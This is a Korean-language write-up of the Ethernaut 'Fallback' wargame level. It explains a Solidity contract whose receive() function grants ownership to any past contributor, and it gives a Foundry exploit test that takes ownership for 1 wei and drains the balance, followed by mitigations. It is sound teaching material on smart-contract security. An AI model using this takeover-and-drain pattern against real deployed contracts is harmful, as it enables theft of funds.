# 01. Fallback

[English](../en/01_Fallback.md) | [한국어](01_Fallback.md)

## 문제 목표

다음 두 조건을 만족하면 레벨을 통과합니다.

1. `Fallback` 컨트랙트의 소유권을 가져온다.
2. 컨트랙트가 보유한 ETH를 모두 인출한다.

## 핵심 개념

- `receive()` 함수
- 빈 calldata를 사용하는 ETH 전송
- `msg.sender` 기반 접근 제어
- 상태 변경과 ETH 수신 로직의 결합
- Foundry의 `vm.prank`, `vm.deal`
- 저수준 `call`

## 컨트랙트 분석

### `contribute`

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;

    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

호출자는 한 번에 `0.001 ether` 미만을 기여할 수 있습니다. 누적 기여금이 현재 소유자의 기여금보다 커지면 소유권을 가져올 수 있습니다.

하지만 배포자의 초기 기여금은 `1000 ether`로 기록되어 있습니다. 정상적인 기여만으로 이 값을 넘기는 것은 비효율적이므로 다른 소유권 변경 경로를 찾아야 합니다.

### `receive`

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

취약점은 `receive()` 함수에 있습니다.

다음 조건만 만족하면 호출자가 새로운 소유자로 지정됩니다.

- 0보다 큰 ETH를 전송한다.
- 과거에 한 번이라도 기여하여 `contributions[msg.sender] > 0`을 만족한다.

소유권 이전을 ETH 수신 로직에 직접 연결했으며, 별도의 명시적인 승인이나 기존 소유자의 검증이 없습니다.

## 공격 흐름

```text
공격자에게 테스트 ETH 지급
        ↓
contribute()에 1 wei 전송
        ↓
contributions[attacker] > 0 충족
        ↓
빈 calldata와 1 wei를 컨트랙트에 전송
        ↓
receive() 실행
        ↓
owner = attacker
        ↓
withdraw() 호출
        ↓
컨트랙트 잔액 전부 인출
```

## Foundry 공격 코드

```solidity
function testExploit() public {
    vm.startPrank(attacker);

    fallback_contract.contribute{value: 1 wei}();

    (bool success,) = address(fallback_contract).call{value: 1 wei}("");
    require(success, "ETH send fail");

    assertEq(fallback_contract.owner(), attacker);

    fallback_contract.withdraw();
    assertEq(address(fallback_contract).balance, 0);

    vm.stopPrank();
}
```

## 왜 빈 calldata를 사용하는가?

Solidity는 calldata가 비어 있고 ETH가 함께 전송되면 `receive()` 함수를 실행합니다.

```solidity
address(target).call{value: 1 wei}("");
```

위 호출은 특정 함수 선택자 없이 ETH만 전송하므로 `Fallback.receive()`가 실행됩니다.

## 취약점의 근본 원인

근본 원인은 단순한 ETH 수신과 중요한 권한 변경을 같은 함수에서 처리한 것입니다.

`receive()`는 ETH를 받는 역할만 수행해야 하지만, 이 컨트랙트는 기여 이력만 확인한 뒤 호출자를 소유자로 지정합니다. 공격자는 매우 적은 금액으로 기여 조건을 만들고 소유권을 탈취할 수 있습니다.

## 권장 완화 방법

- `receive()`에서 소유권 변경 로직을 제거한다.
- 소유권 이전은 별도의 명시적인 함수로 분리한다.
- 기존 소유자만 소유권을 이전할 수 있도록 접근 제어를 적용한다.
- OpenZeppelin의 `Ownable`과 검증된 소유권 이전 패턴을 고려한다.
- 권한 변경 이벤트를 발생시켜 상태 변화를 추적할 수 있게 한다.

## 테스트 실행

```bash
forge test --match-path test/01_Fallback.t.sol -vvv
```

공격 실행 과정을 자세히 확인하려면:

```bash
forge test --match-test testExploit -vvvv
```

## 학습 정리

`private`, `onlyOwner` 같은 키워드가 일부 함수에 사용되었더라도 다른 상태 변경 경로가 열려 있다면 접근 제어는 무력화될 수 있습니다. 권한과 관련된 모든 함수와 특수 함수인 `receive`, `fallback`을 함께 검토해야 합니다.
